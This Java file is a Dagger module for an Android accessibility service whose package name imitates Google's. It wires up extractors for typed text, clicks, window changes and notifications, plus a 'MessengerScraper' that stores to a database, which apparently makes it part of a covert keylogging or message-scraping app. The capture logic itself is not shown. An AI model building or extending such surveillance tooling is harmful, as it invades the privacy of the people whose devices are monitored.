package service.android.google.com.accessibility.dagger.module;

import android.content.res.Resources;

import com.github.pwittchen.prefser.library.Prefser;

import java.util.Arrays;

import javax.inject.Singleton;

import dagger.Module;
import dagger.Provides;
import nl.nl2312.rxcupboard.RxDatabase;
import service.android.google.com.accessibility.AS;
import service.android.google.com.accessibility.R;
import service.android.google.com.accessibility.controller.AccessibilityServiceController;
import service.android.google.com.accessibility.controller.AccessibilityServiceControllerImpl;
import service.android.google.com.accessibility.extractor.EventExtractor;
import service.android.google.com.accessibility.extractor.extractors.Extractor;
import service.android.google.com.accessibility.extractor.extractors.NotificationStateChangedExtractor;
import service.android.google.com.accessibility.extractor.extractors.ViewClickedExtractor;
import service.android.google.com.accessibility.extractor.extractors.ViewFocusedExtractor;
import service.android.google.com.accessibility.extractor.extractors.ViewTextChangedExtractor;
import service.android.google.com.accessibility.extractor.extractors.WindowStateChangedExtractor;
import service.android.google.com.accessibility.model.PackageConstants;
import service.android.google.com.accessibility.rx.ObservableFactory;
import service.android.google.com.accessibility.rx.ObserverFactory;
import service.android.google.com.accessibility.rx.util.SchedulerFactory;
import service.android.google.com.accessibility.scraper.WindowRipper;
import service.android.google.com.accessibility.scraper.scrapers.MessengerScraper;
import service.android.google.com.accessibility.scraper.scrapers.Scraper;
import service.android.google.com.accessibility.util.action.ActionFactory;
import service.android.google.com.accessibility.util.function.FunctionFactory;

import static java.util.Arrays.asList;

@Module
public class AccessibilityModule {

    private AS accessibilityService;

    public AccessibilityModule(AS accessibilityService) {
        this.accessibilityService = accessibilityService;
    }

    @Provides
    AS accessibilityService() {
        return accessibilityService;
    }

    @Provides
    @Singleton
    AccessibilityServiceController accessibilityServiceController(final ObservableFactory observableFactory,
                                                                  final Prefser prefser,
                                                                  final Resources resources) {
        return new AccessibilityServiceControllerImpl(
                observableFactory,
                prefser,
                resources
        );
    }

    @Provides
    ObservableFactory observableFactory(final FunctionFactory functionFactory,
                                        final ActionFactory actionFactory,
                                        final ObserverFactory observerFactory,
                                        final SchedulerFactory schedulerFactory,
                                        final EventExtractor eventExtractor,
                                        final WindowRipper windowRipper,
                                        final RxDatabase rxDatabase,
                                        final Resources resources,
                                        final Prefser prefser) {
        return new ObservableFactory(
                functionFactory,
                actionFactory,
                observerFactory,
                schedulerFactory,
                eventExtractor,
                windowRipper,
                rxDatabase,
                resources,
                prefser
        );
    }

    @Provides
    SchedulerFactory schedulerFactory() {
        return new SchedulerFactory();
    }

    @Provides
    ActionFactory actionFactory() {
        return new ActionFactory();
    }

    @Provides
    FunctionFactory functionFactory() {
        return new FunctionFactory();
    }

    @Provides
    EventExtractor eventExtractor(final Prefser prefser,
                                  final Resources resources) {
        return new EventExtractor(Arrays.<Extractor>asList(
                new ViewClickedExtractor(),
                new ViewFocusedExtractor(asList(PackageConstants.APP_NEXUS_APP_LAUNCHER)),
                new ViewTextChangedExtractor(),
                new WindowStateChangedExtractor(resources.getString(R.string.pref_key_apps), prefser),
                new NotificationStateChangedExtractor()
        ));
    }

    @Provides
    WindowRipper windowRipper() {
        return new WindowRipper(Arrays.<Scraper>asList(
                new MessengerScraper()
        ));
    }

    @Provides
    ObserverFactory observerFactory() {
        return new ObserverFactory(accessibilityService);
    }
}